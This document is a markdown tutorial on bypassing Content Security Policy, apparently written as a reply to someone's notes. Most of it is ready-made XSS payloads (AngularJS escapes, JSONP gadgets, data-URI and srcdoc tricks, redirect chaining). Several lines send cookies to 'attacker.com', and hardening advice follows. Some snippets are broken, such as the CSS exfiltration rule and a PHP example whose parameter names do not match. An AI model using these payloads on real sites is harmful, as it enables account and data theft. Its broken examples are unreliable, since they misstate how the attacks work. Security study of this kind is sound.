# Content Security Policy) bypass techniques.

---

## Table of Contents
1. [What CSP Actually Protects (And Doesn't)](#what-csp-actually-protects)
2. [Critical Missing Directives](#critical-missing-directives)
3. [The `unsafe-inline` Problem](#the-unsafe-inline-problem)
4. [The `unsafe-eval` Problem](#the-unsafe-eval-problem)
5. [Wildcard `*` and Scheme Wildcards](#wildcard--and-scheme-wildcards)
6. [JSONP Endpoints as CSP Gadgets](#jsonp-endpoints-as-csp-gadgets)
7. [CDN & Library-Based Bypasses](#cdn--library-based-bypasses)
8. [Open Redirect + JSONP Chaining](#open-redirect--jsonp-chaining)
9. [File Upload Bypasses](#file-upload-bypasses)
10. [Data: URI Attacks](#data-uri-attacks)
11. [Iframe & srcdoc Bypasses](#iframe--srcdoc-bypasses)
12. [CSP Policy Injection (Chrome-specific)](#csp-policy-injection-chrome-specific)
13. [The Invisible Pixel/Data Exfiltration](#the-invisible-pixeldata-exfiltration)

---

## What CSP Actually Protects (And Doesn't)

First, a critical distinction many miss:

| Attack Type | CSP Can Block | CSP Cannot Block |
|-------------|---------------|------------------|
| Reflected XSS | ✅ Yes (if properly configured) | ❌ If `unsafe-inline` is used |
| Stored XSS | ✅ Yes | ❌ If `unsafe-inline` or weak whitelists |
| DOM-based XSS | ⚠️ Partially | ❌ Often bypassed via `location` tricks |
| **Data exfiltration** | ⚠️ Via `connect-src` | ❌ Via `img` tags, `window.location`, redirects |
| CSRF | ❌ No | N/A |
| Clickjacking | ✅ Via `frame-ancestors` | N/A |

**Key insight:** CSP is a **defense-in-depth** mechanism, not a silver bullet. Your examples show exactly why.

---

## Critical Missing Directives

### Why `object-src 'none'` is Essential

When `object-src` is missing, it falls back to:
1. `default-src` (if defined)
2. If neither exists → **`*` (allow anything)**

**Working payload from your notes:**
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

**Flash-based bypass (legacy but still works on old systems):**
```html
<object type="application/x-shockwave-flash" 
        data="https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//">
    <param name="AllowScriptAccess" value="always">
</object>
```

**Why Flash works:** Flash SWF files can have `AllowScriptAccess=always`, allowing them to call JavaScript on the parent page, completely bypassing CSP script-src restrictions.

### Missing `base-uri`

If `base-uri` isn't set, attackers can change the base URL for relative script tags:
```html
<base href="https://attacker.com/">
<script src="jquery.js"></script> <!-- Actually loads from attacker.com -->
```

### Missing `form-action`

Without `form-action`, attackers can redirect form submissions to their own server:
```html
<form action="https://attacker.com/steal">
    <input type="hidden" name="data" value="sensitive">
    <button>Click me</button>
</form>
```

---

## The `unsafe-inline` Problem

### Why It's Dangerous

`unsafe-inline` allows **any** inline script tags and `javascript:` URIs:

```javascript
// Policy: script-src https://facebook.com https://google.com 'unsafe-inline'
// Working payload:
"/><script>alert(1337);</script>
```

### The Nonce/Hash Alternative

Instead of `unsafe-inline`, use:
```
script-src 'nonce-r4nd0m123' https://trusted.cdn.com
```
Then in HTML:
```html
<script nonce="r4nd0m123">alert('This is allowed');</script>
<script>alert('This is blocked');</script>  <!-- No nonce → blocked -->
```

### The `strict-dynamic` Solution (Modern Browsers)

```
script-src 'strict-dynamic' 'nonce-r4nd0m123' 'unsafe-inline' https:
```
- `'strict-dynamic'` tells the browser to trust any script loaded by an allowed script
- `'unsafe-inline'` is ignored if nonce exists (for backward compatibility)

---

## The `unsafe-eval` Problem

### Why `unsafe-eval` Enables Client-Side Template Injection (CSTI)

AngularJS uses `eval()` internally for its template engine. With `unsafe-eval` allowed, Angular's expression engine becomes an XSS vector.

**Working payload from your notes:**
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script>
<div ng-app>
  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
</div>
```

### How the Payload Works

1. `{{` and `}}` are Angular expression delimiters
2. Angular evaluates expressions inside
3. `$eval()` executes arbitrary JS
4. `constructor.prototype.charAt` trick modifies string behavior to bypass sanitization

**Simpler Angular CSP bypass:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

The `ng-click` directive executes the expression when clicked, and `$event.view` gives access to the window object.

---

## Wildcard `*` and Scheme Wildcards

### The Problem with `https:*`

When you write `script-src https:`, you allow **any** HTTPS origin:

```html
<!-- This works with script-src https: -->
<script src="https://evil.com/exploit.js"></script>
<script src="https://attacker.github.io/payload.js"></script>
```

### The Problem with `data:`

`data:` URIs can contain executable JavaScript:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
Decoded base64: `alert(document.domain)`

### The Problem with `*` (Any Scheme, Any Domain)

```html
<script src="http://evil.com/xss.js"></script>
<script src="https://evil.com/xss.js"></script>
<script src="ftp://evil.com/xss.js"></script>  <!-- Rare but possible -->
```

---

## JSONP Endpoints as CSP Gadgets

### What is JSONP?

JSONP (JSON with Padding) was created to bypass same-origin policy before CORS existed. It works by using a `<script>` tag with a callback parameter.

**Normal JSONP response:**
```javascript
callback({"name": "John", "id": 1})
```

### The Security Problem

If the server doesn't validate the callback name, an attacker can inject JavaScript:

```html
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

**What happens:**
1. Browser downloads the script
2. Server responds with: `alert({"query":"hello",...})`
3. `alert()` executes with the JSON object as argument

### Real JSONP Gadgets (Publicly Known)

| Service | Vulnerable Endpoint | Payload Example |
|---------|---------------------|-----------------|
| Google | `/complete/search?callback=` | `alert(1)` |
| Facebook | `/connect/ping?callback=` | `alert(1)` |
| YouTube | `/youtubei/v1/` | Various |
| Microsoft | `/.well-known/webfinger?resource=` | `alert(1)` |

---

## CDN & Library-Based Bypasses

### Why CDNs Are Risky

Even trusted CDNs can host vulnerable library versions that contain XSS gadgets.

**Prototype.js (version 1.7.2) bypass:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script>
    // Prototype's Template class can evaluate arbitrary JavaScript
    new Template("#{alert(1)}").evaluate();
</script>
```

**AngularJS 1.0.8 CSP bypass:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://attacker.com/steal?cookie='+document.cookie)") }}
</div>
```

### How to Check for Vulnerable CDN Versions

1. **Snyk Vulnerability Database** - `snyk.io/vuln/npm:angular`
2. **Retire.js** - `retirejs.github.io/retire.js/`
3. **CSP Auditor tools** - `https://csp-evaluator.withgoogle.com/`

---

## Open Redirect + JSONP Chaining

### The Attack Chain

```
Whitelisted domain A (has JSONP)
Whitelisted domain B (has open redirect)

Victim loads script from domain B that redirects to domain A with malicious callback
```

### Working Example

**Policy:**
```
script-src 'self' accounts.google.com/random/ website.with.redirect.com
```

**Payload:**
```html
<script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

**Why this works:**
1. Browser only validates the **hostname** (`website.with.redirect.com`) before loading the script
2. The server at `website.with.redirect.com` responds with a 302 redirect
3. Browser follows the redirect to `accounts.google.com/...`
4. The JSONP callback executes `alert(1337)`

### Defense

Never whitelist domains with open redirects. Use path-precise whitelists:
```
script-src 'self' https://accounts.google.com/static/ https://apis.google.com/js/
```

---

## File Upload Bypasses

### When `script-src 'self'` Isn't Enough

If the application allows file uploads, an attacker can:

1. Upload a file with `.js` content but `.png` extension
2. Include it with a `<script>` tag

**Payload:**
```html
<script src="/user_upload/mypic.png.js"></script>
```

### MIME Type Confusion

Some servers:
- Check **file extension** for upload validation (allows `.png`)
- But serve with **correct MIME type** based on extension (`.png` → `image/png`)
- However, `<script src="...">` ignores MIME type and executes as JavaScript

### Better: Upload HTML + XSS

If `object-src` is not `'none'`:
```html
<object data="/user_upload/evil.svg"></object>
```

**evil.svg:**
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
```

---

## Data: URI Attacks

### Direct Execution

```html
<script src="data:text/javascript,alert(1337)"></script>
```

### HTML + Script in Data URI

```html
<iframe src="data:text/html,<script>alert(1337)</script>"></iframe>
```

### Base64 Encoded (Avoids Filters)

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### Defense

Never use `data:` in `script-src` or `object-src`. Use:
```
script-src 'self' https: 'nonce-r4nd0m'
```

---

## Iframe & srcdoc Bypasses

### The srcdoc Attribute

`<iframe srcdoc="...">` allows embedding an entire HTML document inside an iframe attribute.

**Payload:**
```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

### Why This Bypasses Some CSPs

If `default-src` is `'self' data: *` but `connect-src` is `'self'`, the iframe:
1. Has its own JavaScript execution context
2. Can load `data:` URIs regardless of parent CSP
3. Can exfiltrate data via `window.top` access (sometimes limited by SOP)

### Defer/Async Trick (Old Browsers)

```html
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

---

## CSP Policy Injection (Chrome-specific)

### The Vulnerability

Some applications reflect user input into the CSP header itself.

**Example vulnerable code:**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' " . $_GET['policy']);
```

**Attack:**
```
/?search=<script>alert(1)</script>&token=;script-src-elem%20'unsafe-inline'
```

**What happens:**
- The `;` closes the existing `script-src` directive
- `script-src-elem 'unsafe-inline'` adds a new directive that overrides (in Chrome)
- Chrome processes the last `script-src-elem` directive

### Chrome-Specific Behavior

Chrome supports granular directives:
- `script-src-elem` - for `<script>` tags
- `script-src-attr` - for event handlers (`onclick=`, etc.)
- `style-src-elem` - for `<style>` tags
- `style-src-attr` - for `style=` attributes

Attackers can inject these to relax specific restrictions.

---

## The Invisible Pixel/Data Exfiltration

### Why CSP Often Can't Prevent This

Even with strict CSP, **`<img src="...">`** can send data:

```html
<img src="https://attacker.com/steal?cookie=" + document.cookie>
```

But wait — `document.cookie` is JavaScript, which would be blocked by a strict CSP without `unsafe-inline`, right?

**Correct.** But attackers use other methods:

### Method 1: Redirect-Based Exfiltration

```javascript
window.location = 'https://attacker.com/steal?' + document.cookie;
```

If the page has **any** JavaScript execution path (even a tiny DOM XSS), this works.

### Method 2: CSS-Based Exfiltration

```css
body {
    background: url('https://attacker.com/steal?data=' + encodeURIComponent(window.innerWidth));
}
```

### Method 3: Invisible Pixel with Valid JSONP

If you can inject an `<img>` but not JavaScript:
```html
<img src="https://attacker.com/pixel.gif?data=leaked">
```
The browser will make the request automatically.

### Defense

```
img-src 'self' https://trusted-cdn.com
connect-src 'self'
report-uri /csp-violation-report-endpoint
```

But even `img-src 'self'` can leak data via URL parameters if the attacker controls part of the URL.

---

## Summary Table: Vulnerability ↔ CSP Misconfiguration

| Vulnerability | CSP Misconfiguration | Typical Bypass |
|---------------|---------------------|----------------|
| Basic XSS | `'unsafe-inline'` | `<script>alert(1)</script>` |
| Angular CSTI | `'unsafe-eval'` + Angular CDN | `{{$eval.constructor('alert(1)')()}}` |
| JSONP XSS | Whitelisted domain with JSONP | `<script src="domain?callback=alert">` |
| Open redirect chaining | Whitelisted domain with redirect | Redirect → JSONP endpoint |
| File upload XSS | `script-src 'self'` + upload | `<script src="/uploads/xss.js">` |
| Data URI execution | `data:` in script-src | `<script src="data:text/js,alert(1)">` |
| Flash XSS | Missing `object-src 'none'` | SWF with `AllowScriptAccess` |
| Iframe bypass | `default-src data: *` | `<iframe srcdoc="...">` |

---

## Practical Recommendations

### Minimal Secure CSP Template

```
Content-Security-Policy: 
    default-src 'none';
    script-src 'nonce-{random}' 'strict-dynamic';
    style-src 'nonce-{random}';
    img-src 'self' https:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    base-uri 'none';
    frame-ancestors 'none';
    form-action 'self';
    report-uri /csp-report-endpoint;
```

### Tools to Validate CSP

1. **Google CSP Evaluator** - `https://csp-evaluator.withgoogle.com/`
2. **Mozilla Observatory** - `https://observatory.mozilla.org/`
3. **CSP Scanner** - Browser extension for testing
4. **Report URI** - `https://report-uri.com/` (monitoring)

### Testing Methodology

1. Start with the most restrictive policy possible
2. Use `Content-Security-Policy-Report-Only` first
3. Monitor violation reports
4. Add exceptions only when absolutely necessary
5. Never use `unsafe-inline` or `unsafe-eval` in production
6. Avoid wildcards (`*`, `https:`, `data:`)
7. Use `nonce` or `hash` for inline scripts

---

## Final Note

The examples you collected represent **real-world bypasses** found in production systems. Many Fortune 500 companies have had CSP bypasses like these. CSP is powerful but requires **continuous validation** — a policy that works today may be bypassed tomorrow by a new technique or a new vulnerable CDN library version.
